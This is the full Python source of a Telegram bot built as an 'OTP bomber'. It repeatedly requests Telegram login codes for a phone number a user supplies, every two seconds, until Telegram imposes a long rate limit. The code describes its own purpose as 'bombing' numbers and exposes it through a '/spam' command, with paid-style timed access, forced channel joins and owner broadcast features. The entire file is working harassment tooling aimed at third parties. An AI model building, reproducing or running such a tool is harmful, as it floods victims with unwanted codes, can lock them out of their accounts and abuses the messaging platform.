# language: Python, file: main.py, runtime: Python 3.10+
# Host-ready: reads BOT_TOKEN / API_ID / API_HASH / OWNER_IDS / OWNER_USERNAME /
#             FORCE_CHANNEL / FORCE_GROUP from .env

import asyncio
import json
import logging
import os
import re
import time
from collections import defaultdict
from pathlib import Path

from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ChatMemberStatus
from telegram.error import BadRequest, Forbidden
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
)
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    FloodWaitError,
    PhoneNumberInvalidError,
    PhoneNumberBannedError,
)

load_dotenv()

# ─── CONFIG ───────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID", "0"))
API_HASH = os.getenv("API_HASH")
OWNER_USERNAME = os.getenv("OWNER_USERNAME", "jameendar")

# Comma-separated owner user IDs, e.g. 123456789,987654321
OWNER_IDS = {
    int(x.strip())
    for x in os.getenv("OWNER_IDS", "").split(",")
    if x.strip().isdigit()
}

# Force-join targets (@username or full https://t.me/... link)
FORCE_CHANNEL = os.getenv("FORCE_CHANNEL", "").strip()
FORCE_GROUP = os.getenv("FORCE_GROUP", "").strip()

if not BOT_TOKEN or not API_ID or not API_HASH:
    raise SystemExit("Missing BOT_TOKEN / API_ID / API_HASH in environment or .env")
if not OWNER_IDS:
    raise SystemExit("Missing OWNER_IDS in environment or .env (at least one owner required)")

MIN_LIMIT_HOURS = 7
SEND_INTERVAL = 2
DATA_FILE = Path("bot_data.json")

# ─── STATE ────────────────────────────────────────────────────────────────────
active_jobs: dict[int, dict[str, asyncio.Task]] = defaultdict(dict)
PHONE_RE = re.compile(r"^\+\d{8,15}$")

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("otp_bot")

# ─── PERSISTENCE ──────────────────────────────────────────────────────────────
def load_data() -> dict:
    if DATA_FILE.exists():
        try:
            with open(DATA_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    return {"access": {}, "open_mode": False, "known_users": []}


def save_data(data: dict) -> None:
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)


def get_access() -> dict[str, float]:
    return load_data().get("access", {})


def set_access(access: dict[str, float]) -> None:
    data = load_data()
    data["access"] = access
    save_data(data)


def is_open_mode() -> bool:
    return bool(load_data().get("open_mode", False))


def set_open_mode(value: bool) -> None:
    data = load_data()
    data["open_mode"] = value
    save_data(data)


def get_known_users() -> set[int]:
    data = load_data()
    return {int(x) for x in data.get("known_users", []) if str(x).isdigit()}


def add_known_user(user_id: int) -> None:
    data = load_data()
    users = set(data.get("known_users", []))
    users.add(user_id)
    data["known_users"] = list(users)
    save_data(data)


def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS


def has_access(user_id: int) -> bool:
    if is_owner(user_id):
        return True
    if is_open_mode():
        return True
    access = get_access()
    key = str(user_id)
    if key not in access:
        return False
    if time.time() > access[key]:
        del access[key]
        set_access(access)
        return False
    return True


def days_left(user_id: int) -> float:
    access = get_access()
    key = str(user_id)
    if key not in access:
        return 0.0
    remaining = access[key] - time.time()
    return max(0.0, remaining / 86400)


# ─── FORCE JOIN ───────────────────────────────────────────────────────────────
async def is_member(bot, chat_id_or_username: str, user_id: int) -> bool:
    if not chat_id_or_username:
        return True
    try:
        # For membership check we need the chat identifier Telegram understands
        # (@username or numeric id). If user put a full invite link, strip it.
        target = chat_id_or_username
        if "t.me/" in target:
            # extract username or +invite part is not usable for get_chat_member
            # so we keep only @username form when possible
            part = target.split("t.me/")[-1].split("?")[0]
            if part.startswith("+"):
                # private invite link – cannot check membership reliably this way
                return True  # skip hard check, still show button
            target = "@" + part if not part.startswith("@") else part

        member = await bot.get_chat_member(target, user_id)
        return member.status in (
            ChatMemberStatus.MEMBER,
            ChatMemberStatus.ADMINISTRATOR,
            ChatMemberStatus.OWNER,
            ChatMemberStatus.RESTRICTED,
        )
    except (BadRequest, Forbidden) as e:
        log.warning("Membership check failed for %s / %s: %s", chat_id_or_username, user_id, e)
        return False
    except Exception as e:
        log.warning("Unexpected membership error: %s", e)
        return False


def make_join_link(value: str) -> str | None:
    if not value:
        return None
    value = value.strip()
    if value.startswith("https://t.me/") or value.startswith("http://t.me/"):
        return value
    if value.startswith("@"):
        return f"https://t.me/{value[1:]}"
    if value.startswith("t.me/"):
        return f"https://{value}"
    return None


async def check_force_join(bot, user_id: int) -> tuple[bool, str, InlineKeyboardMarkup | None]:
    if not is_open_mode():
        return True, "", None

    missing = []
    buttons = []

    if FORCE_CHANNEL:
        is_in = await is_member(bot, FORCE_CHANNEL, user_id)
        if not is_in:
            missing.append("Channel")
            link = make_join_link(FORCE_CHANNEL)
            if link:
                buttons.append(InlineKeyboardButton("📢 Join Channel", url=link))

    if FORCE_GROUP:
        is_in = await is_member(bot, FORCE_GROUP, user_id)
        if not is_in:
            missing.append("Group")
            link = make_join_link(FORCE_GROUP)
            if link:
                buttons.append(InlineKeyboardButton("👥 Join Group", url=link))

    if not missing:
        return True, "", None

    text = (
        "🔒 You must join the required chats before using this bot.\n\n"
        "Tap the buttons below, join both, then send /start again."
    )
    markup = InlineKeyboardMarkup([buttons]) if buttons else None
    return False, text, markup


def access_denied_text() -> str:
    return (
        "🔒 Access denied.\n"
        f"Contact the owner @{OWNER_USERNAME} to get access."
    )


# ─── WORKER ───────────────────────────────────────────────────────────────────
async def otp_worker(user_id: int, phone: str, chat_id: int, bot):
    try:
        while True:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            try:
                await client.connect()
                await client.send_code_request(phone)
                log.info("OTP sent → %s (user %s)", phone, user_id)
            except FloodWaitError as e:
                wait = e.seconds
                hours = wait / 3600.0
                if hours >= MIN_LIMIT_HOURS:
                    msg = (
                        f"🚫 OTP Sending Stopped!\n"
                        f"Number: {phone}\n"
                        f"Error: Telegram Rate Limit hit: You must wait ~{hours:.1f} hours "
                        f"before trying this number again.\n"
                        f"Stopping the process."
                    )
                    await bot.send_message(chat_id, msg)
                    break
                else:
                    log.info(
                        "Short FloodWait %ss (%.2fh) on %s — sleeping then resume",
                        wait, hours, phone,
                    )
                    await asyncio.sleep(wait)
                    continue
            except (PhoneNumberInvalidError, PhoneNumberBannedError) as e:
                await bot.send_message(chat_id, f"❌ {phone} rejected by Telegram: {e}")
                break
            except asyncio.CancelledError:
                raise
            except Exception as ex:
                log.warning("Transient error on %s: %s", phone, ex)
                await asyncio.sleep(5)
                continue
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

            await asyncio.sleep(SEND_INTERVAL)
    finally:
        if phone in active_jobs.get(user_id, {}):
            del active_jobs[user_id][phone]
            if not active_jobs[user_id]:
                del active_jobs[user_id]


# ─── HELPERS ──────────────────────────────────────────────────────────────────
def is_valid_phone(text: str) -> bool:
    return bool(PHONE_RE.match(text.strip()))


async def start_job(user_id: int, phone: str, chat_id: int, bot) -> str:
    phone = phone.strip()
    if not is_valid_phone(phone):
        return (
            "❌ Invalid phone number format. "
            "Please include the country code (e.g., +919876543210)."
        )

    if phone in active_jobs.get(user_id, {}):
        return (
            f"⚠️ You are already bombing {phone}! "
            f"To stop it, use /stop {phone}."
        )

    task = asyncio.create_task(otp_worker(user_id, phone, chat_id, bot))
    active_jobs[user_id][phone] = task

    return (
        f"🚀 Started sending OTPs to {phone}!\n"
        f"I will keep sending every {SEND_INTERVAL} seconds until a ≥{MIN_LIMIT_HOURS}h "
        f"limit is reached or you use /stop."
    )


async def stop_jobs(user_id: int, phone: str | None = None) -> str:
    jobs = active_jobs.get(user_id, {})
    if not jobs:
        return "⚠️ No active processes found for you."

    if phone:
        phone = phone.strip()
        task = jobs.pop(phone, None)
        if task is None:
            return f"⚠️ No active process found for {phone}."
        task.cancel()
        try:
            await task
        except asyncio.CancelledError:
            pass
        if not jobs:
            del active_jobs[user_id]
        return f"🛑 Stopped sending OTP on {phone}."

    numbers = list(jobs.keys())
    count = len(numbers)
    for t in list(jobs.values()):
        t.cancel()
    for t in list(jobs.values()):
        try:
            await t
        except asyncio.CancelledError:
            pass
    del active_jobs[user_id]

    if count == 1:
        return f"🛑 Stopped sending OTP on {numbers[0]}."
    return f"🛑 Stopped {count} active OTP process(es):\n" + "\n".join(f"• {n}" for n in numbers)


# ─── ACCESS GATE ──────────────────────────────────────────────────────────────
async def gate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    uid = update.effective_user.id
    add_known_user(uid)

    if is_owner(uid):
        return True

    if is_open_mode():
        ok, msg, markup = await check_force_join(context.bot, uid)
        if not ok:
            await update.message.reply_text(msg, reply_markup=markup)
            return False
        return True

    if not has_access(uid):
        await update.message.reply_text(access_denied_text())
        return False
    return True


# ─── HANDLERS ─────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    add_known_user(uid)

    if not await gate(update, context):
        return

    text = (
        "👋 Welcome to the OTP Bot.\n\n"
        "This bot sends OTPs to a phone number every 2 seconds until a long rate-limit is hit.\n\n"
        "📌 Private chat: just send the phone number (with country code).\n"
        "📌 Group chat: /spam +919876543210\n"
        "/stop — stop all your jobs\n"
        "/stop +919876543210 — stop one number\n"
    )
    if is_owner(uid):
        text += (
            "\n── Owner commands ──\n"
            "/adduser <user_id> <days>\n"
            "/removeuser <user_id>\n"
            "/showuser\n"
            "/open  — allow everyone (force-join still required)\n"
            "/lock  — restrict to accessed users only\n"
            "/broadcast <message>  — send to all known users\n"
        )
    await update.message.reply_text(text)


async def cmd_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await gate(update, context):
        return

    if not context.args:
        await update.message.reply_text("Usage: /spam +919876543210")
        return

    phone = context.args[0]
    reply = await start_job(
        update.effective_user.id,
        phone,
        update.effective_chat.id,
        context.bot,
    )
    await update.message.reply_text(reply)


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await gate(update, context):
        return

    phone = context.args[0] if context.args else None
    reply = await stop_jobs(update.effective_user.id, phone)
    await update.message.reply_text(reply)


async def plain_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private":
        return
    if not await gate(update, context):
        return

    text = (update.message.text or "").strip()
    if not is_valid_phone(text):
        return

    reply = await start_job(
        update.effective_user.id,
        text,
        update.effective_chat.id,
        context.bot,
    )
    await update.message.reply_text(reply)


# ─── OWNER COMMANDS ───────────────────────────────────────────────────────────
async def cmd_adduser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /adduser <user_id> <days>")
        return
    try:
        uid = int(context.args[0])
        days = float(context.args[1])
    except ValueError:
        await update.message.reply_text("user_id and days must be numbers.")
        return

    access = get_access()
    access[str(uid)] = time.time() + days * 86400
    set_access(access)
    add_known_user(uid)
    await update.message.reply_text(f"✅ User {uid} granted access for {days} day(s).")


async def cmd_removeuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /removeuser <user_id>")
        return
    try:
        uid = int(context.args[0])
    except ValueError:
        await update.message.reply_text("user_id must be a number.")
        return

    access = get_access()
    if str(uid) in access:
        del access[str(uid)]
        set_access(access)
        await update.message.reply_text(f"✅ User {uid} removed.")
    else:
        await update.message.reply_text(f"⚠️ User {uid} was not in the access list.")


async def cmd_showuser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    access = get_access()
    if not access:
        await update.message.reply_text("No users in access list.")
        return
    lines = []
    now = time.time()
    for uid, exp in access.items():
        left = max(0.0, (exp - now) / 86400)
        lines.append(f"• {uid} — {left:.1f} days left")
    await update.message.reply_text("Access list:\n" + "\n".join(lines))


async def cmd_open(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    set_open_mode(True)
    await update.message.reply_text(
        "✅ Bot is now OPEN.\n"
        "Anyone who joins the required channel + group can use it."
    )


async def cmd_lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return
    set_open_mode(False)
    await update.message.reply_text(
        "🔒 Bot is now LOCKED.\n"
        "Only owners and users added with /adduser can use it."
    )


async def cmd_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update.effective_user.id):
        return

    text = " ".join(context.args).strip() if context.args else ""
    if not text and update.message.reply_to_message:
        text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
    if not text:
        await update.message.reply_text(
            "Usage:\n"
            "/broadcast <message>\n"
            "or reply to a message with /broadcast"
        )
        return

    users = get_known_users()
    for uid_str in get_access():
        users.add(int(uid_str))
    users.update(OWNER_IDS)

    sent = 0
    failed = 0
    for uid in users:
        try:
            await context.bot.send_message(uid, text)
            sent += 1
            await asyncio.sleep(0.05)
        except Exception:
            failed += 1

    await update.message.reply_text(f"📣 Broadcast done. Sent: {sent} | Failed: {failed}")


# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("spam", cmd_spam))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("adduser", cmd_adduser))
    app.add_handler(CommandHandler("removeuser", cmd_removeuser))
    app.add_handler(CommandHandler("showuser", cmd_showuser))
    app.add_handler(CommandHandler("open", cmd_open))
    app.add_handler(CommandHandler("lock", cmd_lock))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, plain_phone))

    log.info("Bot starting…")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()